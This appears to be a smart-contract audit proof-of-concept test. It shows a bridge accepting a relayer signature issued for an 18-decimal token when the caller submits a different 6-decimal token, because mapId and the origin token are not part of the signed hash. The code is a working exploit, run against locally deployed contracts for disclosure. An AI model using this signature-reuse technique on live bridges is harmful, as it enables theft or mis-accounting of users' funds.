import hre from "hardhat";
import {expect} from "chai";

describe("Finding 1 - mapId/originToken not bound to relayer signature", function () {
  it("accepts a signature issued for 18-decimal Token A when caller submits 6-decimal Token B", async function () {
    const [, multisig, emergency, relayer, user] = await hre.ethers.getSigners();

    const Token = await hre.ethers.getContractFactory("PocToken");
    const tokenA = await Token.deploy(18);
    const tokenB = await Token.deploy(6);
    const targetToken = await Token.deploy(18);

    const Mapper = await hre.ethers.getContractFactory(
      "contracts/main/modules/mapper/Mapper.sol:Mapper"
    );
    const mapper = await hre.upgrades.deployProxy(
      Mapper,
      [{ emergencyAddress: emergency.address, multisigAddress: multisig.address }],
      { initializer: "initialize" }
    );
    await mapper.waitForDeployment();

    const Bridge = await hre.ethers.getContractFactory("Bridge");
    const bridge = await hre.upgrades.deployProxy(
      Bridge,
      [{
        mapperAddress: await mapper.getAddress(),
        emergencyAddress: emergency.address,
        multisigAddress: multisig.address,
        relayerAddress: relayer.address
      }],
      { initializer: "initialize" }
    );
    await bridge.waitForDeployment();

    const chainId = (await hre.ethers.provider.getNetwork()).chainId;
    const targetChainId = 999999n;
    const targetTokenAddress = hre.ethers.zeroPadValue(await targetToken.getAddress(), 32);
    const b32 = (address: string) => hre.ethers.zeroPadValue(address, 32);

    const map = (originToken: string) => ({
      originChainId: chainId,
      targetChainId,
      depositType: 1,
      withdrawType: 0,
      originTokenAddress: b32(originToken),
      targetTokenAddress,
      useTransfer: false,
      isAllowed: true,
      isCoin: false
    });

    await (await mapper.connect(multisig).registerMapping(map(await tokenA.getAddress()))).wait();
    await (await mapper.connect(multisig).registerMapping(map(await tokenB.getAddress()))).wait();

    const mapA = await mapper.mapInfo(1n);
    const mapB = await mapper.mapInfo(2n);

    expect(mapA.targetTokenAddress).to.equal(mapB.targetTokenAddress);
    expect(mapA.originTokenAddress).to.not.equal(mapB.originTokenAddress);

    // Same raw amount means 100 Token A (18 decimals) but 100 trillion Token B (6 decimals).
    const amount = 100n * 10n ** 18n;
    await (await tokenB.transfer(user.address, amount)).wait();
    await (await tokenB.connect(user).approve(await bridge.getAddress(), amount)).wait();

    const toAddress = b32(user.address);
    const gasAmount = 0n;
    const deadline = BigInt((await hre.ethers.provider.getBlock("latest"))!.timestamp) + 3600n;
    const salt = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("finding-1-decimals-poc"));

    const signedHash = hre.ethers.solidityPackedKeccak256(
      ["address", "bytes32", "bytes32", "uint256", "uint256", "uint256", "uint256", "uint64", "bytes32"],
      [
        user.address,
        toAddress,
        mapA.targetTokenAddress,
        gasAmount,
        amount,
        mapA.originChainId,
        mapA.targetChainId,
        deadline,
        salt
      ]
    );

    const signature = await relayer.signMessage(hre.ethers.getBytes(signedHash));
    const sig = hre.ethers.Signature.from(signature);

    const bridgeAddress = await bridge.getAddress();
    const beforeUserB = await tokenB.balanceOf(user.address);
    const beforeBridgeB = await tokenB.balanceOf(bridgeAddress);

    const tx = await bridge.connect(user).bridgeTokens(
      {
        bridgeParams: { mapId: 2n, amount, toAddress },
        ECDSAParams: { r: sig.r, s: sig.s, v: sig.v, deadline, salt }
      },
      { value: gasAmount }
    );

    await expect(tx)
      .to.emit(bridge, "Deposit")
      .withArgs(
        b32(user.address),
        toAddress,
        mapB.originTokenAddress,
        mapB.targetTokenAddress,
        amount,
        mapB.originChainId,
        mapB.targetChainId
      );

    const afterUserB = await tokenB.balanceOf(user.address);
    const afterBridgeB = await tokenB.balanceOf(bridgeAddress);

    expect(beforeUserB - afterUserB).to.equal(amount);
    expect(afterBridgeB - beforeBridgeB).to.equal(amount);

    console.log("Signed raw amount as Token A (18 decimals):", hre.ethers.formatUnits(amount, 18));
    console.log("Same raw amount as Token B (6 decimals):", hre.ethers.formatUnits(amount, 6));
    console.log("User Token B balance before:", hre.ethers.formatUnits(beforeUserB, 6));
    console.log("User Token B balance after :", hre.ethers.formatUnits(afterUserB, 6));
    console.log("Bridge Token B balance before:", hre.ethers.formatUnits(beforeBridgeB, 6));
    console.log("Bridge Token B balance after :", hre.ethers.formatUnits(afterBridgeB, 6));
    console.log("Raw amount locked:", amount.toString());

    expect(hre.ethers.formatUnits(amount, 18)).to.equal("100.0");
    expect(hre.ethers.formatUnits(amount, 6)).to.equal("100000000000000");
    expect(await bridge.usedHashes(signedHash)).to.equal(true);
  });
});
